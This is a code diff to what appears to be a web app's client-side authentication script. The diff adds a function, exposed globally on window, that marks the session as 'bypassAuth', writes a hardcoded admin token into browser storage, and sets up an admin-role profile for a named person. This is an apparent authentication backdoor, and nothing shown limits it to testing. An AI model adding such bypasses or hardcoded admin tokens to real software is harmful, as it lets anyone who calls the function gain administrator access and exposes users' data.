@@ -562,6 +562,30 @@
     });
   }
 
+  function enableIsaacAdminBypass(options) {
+    const config = options && typeof options === 'object' ? options : {};
+    const bypassProfile = normalizeKnownUser({
+      id: String(config.id || 'admin-bypass-isaac').trim(),
+      name: String(config.name || 'Isaac Haro').trim(),
+      email: String(config.email || ISAAC_ADMIN_BYPASS_EMAIL).trim().toLowerCase(),
+      role: 'admin',
+      avatarUploadId: String(config.avatarUploadId || '').trim(),
+      avatarImage: String(config.avatarImage || '').trim()
+    });
+
+    localStorage.setItem('bypassAuth', 'true');
+    localStorage.setItem('bypassProfile', JSON.stringify(bypassProfile));
+    localStorage.setItem('authToken', ISAAC_ADMIN_BYPASS_TOKEN);
+    sessionStorage.setItem('authToken', ISAAC_ADMIN_BYPASS_TOKEN);
+
+    const storedUser = writeStoredUser(bypassProfile, { force: true });
+    window.dispatchEvent(new CustomEvent('fast-auth-bypass-enabled', {
+      detail: { user: storedUser }
+    }));
+
+    return storedUser;
+  }
+
   function handleExternalAuthStorageChange(event) {
     const changedKey = String(event && event.key || '').trim();
     if (!changedKey || !['authToken', 'user', 'userProfile', AUTH_USER_LOCK_KEY].includes(changedKey)) {
@@ -2905,6 +2929,10 @@
 
   window.writeStoredUserIdentity = function(userLike) {
     return writeStoredUser(userLike);
+  };
+
+  window.enableIsaacAdminBypass = function(options) {
+    return enableIsaacAdminBypass(options);
   };
 
   window.clearStoredAuthState = function() {
